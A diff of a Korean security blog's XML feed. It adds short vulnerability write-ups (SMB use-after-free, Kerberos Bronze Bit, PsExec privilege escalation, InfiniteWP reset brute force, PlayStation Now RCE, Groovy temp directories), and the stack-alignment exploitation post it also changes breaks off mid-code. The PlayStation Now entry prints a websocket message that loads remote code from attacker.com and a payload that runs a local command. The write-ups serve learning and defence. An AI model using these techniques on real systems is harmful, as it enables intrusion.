@@ -4,11 +4,203 @@
   
   
   <entry>
+    <title>[하루한줄] CVE-2020-17140 : SMB uaf to info disclosure</title>
+    <link href="/2020/12/12/fabu1ous/2020-12-12/"/>
+    <url>/2020/12/12/fabu1ous/2020-12-12/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys 드라이버</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)에서 CVE-2020-17140가 패치되어 Write-up이 공개되었습니다. CVE-2020-17140은 <code>SMB2_SET_INFO</code> 패킷의 처리 로직에서 발생하는 use after free로 커널 메모리를 노출시키는 취약점입니다.</p><p>SMBv2 이후부터 LEASE라는 새로운 caching mechanism이 도입되었고 클라이언트는 <code>SMB2_CREATE_REQEUST_LEASE_V2</code> 패킷을 보내 공유 파일에 lease를 생성하고, <code>SMB2_SET_INFO</code> 패킷을 보내 공유 파일의 lease를 수정할 수 있습니다.</p><p>srv2.sys 드라이버는 SMB2_SET_INFO 패킷을 받으면 <code>srv2!Smb2UpdateLeaseFileName</code>를 호출해서 lease 이름을 수정하는데, new lease name이 기존의 old lease name보다 길 경우 새로운 메모리(newFileBuf)를 할당해 old lease name을 백업합니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease name을 담고 있던 oldFileBuf를 할당 해제한 후에 newFileBuf에 복사하기 때문에 use after free가 발생합니다. oldFileBuf를 해제한 후 댕글링 포인터의 상태에 따라 kernel info leak 또는 BSoD로 이어질 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>kernel</tag>
+      
+      <tag>use after free</tag>
+      
+      <tag>smb</tag>
+      
+      <tag>info leak</tag>
+      
+      <tag>bsod</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
+    <link href="/2020/12/11/l0ch/2020-12-11/"/>
+    <url>/2020/12/11/l0ch/2020-12-11/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Kerberos는 Windows Active Directory 도메인 내에서 사용자, 서버 및 기타 리소스를 서로 인증하는 데 사용되는 프로토콜입니다.<br>Kerberos의 기존 공격 방법인 Golden Ticket 및 Silver Ticket 공격의 변형인 Bronze Bit 공격이 공개되었습니다.</p><blockquote><p>Golden/Silver Ticket 공격<br>내부 네트워크에 침입한 이후 동일한 네트워크의 Kerberos 인증시스템을 사용하는 다른 시스템의 자격 증명을 위조하는 공격기법</p></blockquote><br><p>Bronze Bit는 Microsoft가 Kerberos 프로토콜에 추가 한 <code>S4U2self</code> 및 <code>S4U2proxy</code> 프로토콜을 악용하며 Kerberos 프로세스가 변조된 서비스 티켓을 감지할 수 없어 발생합니다. 공격을 위해서는 다음 조건이 만족되어야 합니다.</p><ol><li>해커는 내부 네트워크의 시스템 하나(Service1)를 장악해 Active Directory 내에 접근 권한이 있어야 합니다.</li><li>침입한 시스템인 Service1에 대한 암호 해시가 필요합니다.</li><li>Service1에는 다른 시스템(Service2)에 대한 제한된 신뢰 관계가 있습니다.</li></ol><p>위 조건이 만족되면 해커는 다음과 같은 공격이 가능합니다.</p><ol><li>사용자를 식별하고 티켓을 반환하는 <code>S4U2self</code> 에서 User2의 Service1 서비스 티켓을 가져옵니다. 이때 <code>force-forwardable</code> 옵션을 사용하면 반환하는 서비스 티켓이 전달 가능한 티켓으로 변환됩니다.</li><li>Service1의 해시로 티켓을 복호화하고 플래그 값의 두 번째 비트를 0→1 로 변경한 뒤 다시 암호화합니다. </li><li>조작된 티켓은 <code>S4U2proxy</code> 에서 전송되고 Service2에 대한 서비스 티켓이 User2로 반환되어 <code>User2.ccache</code>의 디스크에 기록됩니다.</li><li>해커는 Service1 유저(User1) 권한으로 Service2 유저(User2)의 Kerberos 서비스 티켓을 얻을 수 있어 User2 권한으로 Service2에 액세스가 가능합니다.</li></ol><p>이는 Golden/Silver Ticket과 유사한 공격 방법이지만 단일 비트 플립을 이용했기 때문에 Bronze Bit로 명명되었습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>windows</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>kerberos</tag>
+      
+      <tag>bronze bit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] PsExec Local Privilege Escalation</title>
+    <link href="/2020/12/10/idioth/2020-12-10/"/>
+    <url>/2020/12/10/idioth/2020-12-10/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>SysInternals Suite에서 원격으로 애플리케이션을 실행할 수 있는 PsExec에서 Local Privilege Escalation 취약점이 발견됐습니다. 해당 취약점은 글을 작성한 시점의 버전인 PsExec v2.2까지 영향을 미치며 아직 패치되지 않았습니다.</p><p>PsExec 클라이언트와 원격 PSEXESVC 서비스는 named pipe를 통해 통신합니다. 그 중 <code>\\PSEXESVC</code> 파이프는 실행할 응용 프로그램, 명령줄 데이터 등 PsExec 클라이언트의 명령을 분석하여 실행하는 역할을 합니다. <code>\\PSEXESVC</code> 파이프는 Administrator만 read/write 권한을 가져 권한이 낮은 사용자가 파이프에 read\write 하는 것을 막습니다.</p><p>하지만 PSEXESVC가 <code>\\PSEXESVC</code> 파이프를 생성할 때 파이프가 이미 존재할 경우 해당 <code>\\PSEXESVC</code> 파이프의 handle을 가져옵니다. 따라서 낮은 권한의 애플리케이션이 PSEXESVC가 실행되기 전에 <code>\\PSEXESVC</code> 파이프를 생성하면 PSEXESVC는 자신이 생성한 파이프가 아닌 이미 존재하는 파이프의 handle을 가져옵니다. PSEXESVC가 낮은 권한으로 생성된 <code>\\PSEXESVC</code> 파이프의 handle을 가져오면 PSEXESVC을 통해 SYSTEM 권한으로 명령, 응용 프로그램 실행이 가능합니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>lpe</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>named pipe</tag>
+      
+      <tag>psexec</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2020-28642: Auth bypass via password reset mechanism</title>
+    <link href="/2020/12/09/fabu1ous/2020-12-09/"/>
+    <url>/2020/12/09/fabu1ous/2020-12-09/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 웹사이트의 관리 솔루션 Infinite WP에서 비밀번호 재설정 방식의 결함을 이용해 admin panel에 접근할 수 있는 인증 우회 취약점이 발견되었습니다.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;hashCode&#x27;</span> =&gt; <span class="hljs-string">&#x27;resetPassword&#x27;</span>, <span class="hljs-string">&#x27;uniqueTime&#x27;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;userPin&#x27;</span> =&gt; $userDets[<span class="hljs-string">&#x27;userID&#x27;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>비밀번호 재설정 링크를 생성하는 php코드입니다.  피해자의 <code>email</code>을 사전에 입수하고 <code>userID</code>,  <code>microtime(true)</code> 값을 유추할 수 있다면 누구나 유효한 링크를 타고 원하는 유저의 비밀번호를 재설정할 수 있습니다.</p><ul><li>userID<ul><li>auto-increment integer입니다. manage-user라는 유료 addon을 구매하지 않았다면 기본값이 1입니다.</li></ul></li><li>email<ul><li>가입되지 않은 email 주소라면 <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>로 redirect 됩니다. 이를 이용해 Infinite WP에 가입된 email인지 판별할 수 있습니다.</li></ul></li><li>microtime(true)<ul><li>microtime(true)의 값은 비밀번호 재설정 링크가 만들어질 때의 Unix timestamp입니다. Http date 해더 값을 이용해 유추가 가능합니다.</li></ul></li></ul><p>생성된 링크는 24시간 동안 유효합니다. 공개된 POC는 위에서 설명한 세 값을 이용해 브루트포싱 공격을 시도하며 평균 1시간 내외로 유효한 링크를 찾아냅니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>authentication bypass</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] Remote Code Execution in PlayStation Now</title>
+    <link href="/2020/12/08/l0ch/2020-12-08/"/>
+    <url>/2020/12/08/l0ch/2020-12-08/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now ≤ 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>게임 스트리밍 서비스 PlayStation Now에서 원격 코드 실행 취약점이 발견되었습니다.<br><br><br>PS Now의 주요 구성요소로는 QAS와 AGL이 있습니다. QAS는 Qt5 프레임워크로 개발된  <code>psnowlauncher.exe</code> 실행파일이며 PS Now의 메인 애플리케이션입니다.  AGL은 Electron 응용 프로그램이며 QAS에 의해 실행됩니다. 처음 로드할 페이지의 URL을 매개변수로 받아 실행이 가능합니다.<br><br><br><code>nodeIntegration</code>은 <code>Electron BrowserWindows</code>에서 실행되는 기능으로 javascript에서 Windows 프로세스를 생성할 수 있습니다. 기본값은 false지만 AGL에서는 true로 설정되어 있으며, AGL은 로드하는 URL 검증을 하지 않아 해커의 페이로드가 담긴 URL을 통해 javascript에서 임의 코드를 실행할 수 있습니다.<br><br><br>이 임의 코드 실행 취약점은 QAS에서 실행되는 로컬 웹 소켓 서버를 통해 원격으로 수행할 수 있습니다. 웹사이트가 다음 request를 로컬 웹 소켓 서버에 보내면 AGL에 로드된 URL을 QAS에서 실행합니다.  </p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: &#123;    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  &#125;,  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>&#125;</code></pre><p>그러나 source와 target을 바꿔 URL을 AGL에서 로드할 수 있도록 구성하면 원격에서 AGL이 로드할 URL을 조작할 수 있습니다.<br><br><br>피해자의 컴퓨터에서 PS Now와 QAS, 로컬 웹 소켓이 실행 중일 경우 아래와 같은 방법으로 원격 코드 실행이 가능합니다.</p><ol><li><p>브라우저로 해커의 웹사이트에 접속합니다.</p></li><li><p>웹 사이트는 피해자 PC의 웹 소켓 서버 <code>ws://localhost:1235</code> 에 연결됩니다.</p></li><li><p>웹사이트는 웹 소켓 서버에 다음과 같은 메시지를 보냅니다. </p> <pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:&#123;<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>&#125;,<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>&#125;</code></pre></li><li><p>AGL은 <code>https://attacker.com/rce_payload.html</code> 를 로드합니다. 이때 <code>rce_payload.html</code>의 javascript 코드가 피해자의 PC에서 실행됩니다.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>rce</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>playstation</tag>
+      
+      <tag>remote code execution</tag>
+      
+      <tag>playstation now</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2020-17521: Apache Groovy Information Disclosure</title>
+    <link href="/2020/12/07/idioth/2020-12-07/"/>
+    <url>/2020/12/07/idioth/2020-12-07/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovy에서 <code>createTempDir</code> method로 인한 Local Privilege Escalation과 Information Disclosure가 가능한 취약점이 발견되었습니다. 이 취약점은 유닉스 기반 운영 체제와 Mac OSX, Windows의 옛날 버전이 영향을 받습니다. 취약점에 노출되는 조건은 아래와 같습니다.</p><ul><li>영향을 받는 운영 체제에서 Groovy code가 동작</li><li>다른 유저가 Groovy code에 접근할 수 있음</li><li><code>createTempDir</code> extension method를 통해 임시 디렉터리가 생성</li></ul><p>Groovy는 모든 유저가 공유할 수 있는 OS 임시 디렉터리 내에 임시 디렉터리를 만들 수 있습니다. Groovy에서 <code>createTempDir</code> method를 사용하면 java stub을 생성할 때 사용되거나 user code를 대신하기 위한 임시 디렉터리가 생성됩니다. Groovy user code가 <code>createTempDir</code> method를 사용하여 임시 디렉터리에 실행할 수 있는 코드를 저장하면 Local Privilege Escalation이 가능하고 민감한 정보를 저장하기 위해 임시 디렉터리가 사용된다면 정보가 노출되거나 수정될 수 있습니다.</p><p>취약점이 수정된 Groovy 2.5 이상 버전과 JDK 7 이상에서 실행되는 Groovy 2.4에서는 Groovy Code를 실행하는 사용자만 읽을 수 있는 디렉터리를 생성하는 새로운 JDK method를 사용합니다. 하지만 이 방법은 Local Privilege Escalation은 막을 수 있지만 Information Disclosure는 막을 수 없습니다.</p><p>시스템 환경 변수 <code>java.io.tmpdir</code>를 실행 중인 사용자의 고유 디렉터리로 설정하면 모든 운영 체제와 Groovy 버전에서 취약점이 해결됩니다. 혹은 Groovy extension method 대신 JDK의 <code>Files#createTempDirectory</code> method를 사용하여 취약점을 방지할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>lpe</tag>
+      
+      <tag>information disclosure</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>apache</tag>
+      
+      <tag>groovy</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[Research] x64 stack alignment</title>
     <link href="/2020/12/06/fabu1ous/x64-stack-alignment/"/>
     <url>/2020/12/06/fabu1ous/x64-stack-alignment/</url>
     
-    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 system(“/bin/sh”)을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 사실 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 main() 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 [SSE instruction](<a href="https://docs.oracle.com/cd/E26502_01/html/E28388/eojde.html#:~:text=SSE">https://docs.oracle.com/cd/E26502_01/html/E28388/eojde.html#:~:text=SSE</a> instructions are an extension,MXSCR state management instructions)을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 do_system()을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p>!<img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span 